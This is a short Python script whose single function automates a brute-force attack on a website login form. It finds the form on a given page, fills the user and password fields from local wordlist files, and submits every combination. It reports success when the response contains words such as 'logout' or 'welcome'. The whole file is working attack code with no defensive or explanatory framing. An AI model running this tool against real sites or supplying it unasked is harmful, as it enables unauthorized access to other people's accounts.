import requests
from itertools import product
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin

def brute_force_login(page_url, session):
    print(f"[*] Starting brute-force login on: {page_url}")

    try:
        resp = session.get(page_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
    except Exception as e:
        print(f"[!] Failed to load login page: {e}")
        return None

    form = soup.find("form")
    if not form:
        print("[-] No <form> found on the page.")
        return None

    action = form.get("action")
    print(" action",action )
    form_action = urljoin(page_url, action) if action else page_url
    print("form action, ", form_action)
    method = form.get("method", "post").lower()

    inputs = form.find_all("input")
    input_names = [i.get("name") for i in inputs if i.get("name")]

    # Load credentials
    base_dir = os.path.dirname(os.path.abspath(__file__))
    user_file = os.path.join(base_dir, "usernames.txt")
    pass_file = os.path.join(base_dir, "passwords.txt")

    try:
        with open(user_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(pass_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Username or password file not found.")
        return None

    for username, password in product(usernames, passwords):
        data = {}
        for tag in inputs:
            name = tag.get("name")
            if not name:
                continue
            # Fill based on name heuristics
            if any(k in name.lower() for k in ["user", "email", "uid", "login"]):
                data[name] = username
            elif any(k in name.lower() for k in ["pass", "pwd"]):
                data[name] = password
            else:
                data[name] = tag.get("value", "test")  # Keep default or dummy

        print(f"Trying: {username} | {password}")
        try:
            if method == "post":
                response = session.post(form_action, data=data, timeout=10)
            else:
                response = session.get(form_action, params=data, timeout=10)
            # Debugging output
            if username == "admin" and password == "admin":
                print(f"[DEBUG] Status: {response.status_code} | URL: {response.url}")
                print(f"[DEBUG] Response Snippet:\n{response.text}\n")

            text = response.text.lower()

            if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in", "hello"]):
                print(f"[+] Brute-force success: {username}:{password}")
                return (username, password)

        except Exception as e:
            print(f"[!] Error during attempt {username}:{password} → {e}")

    print("[-] No valid credentials found.")
    return None
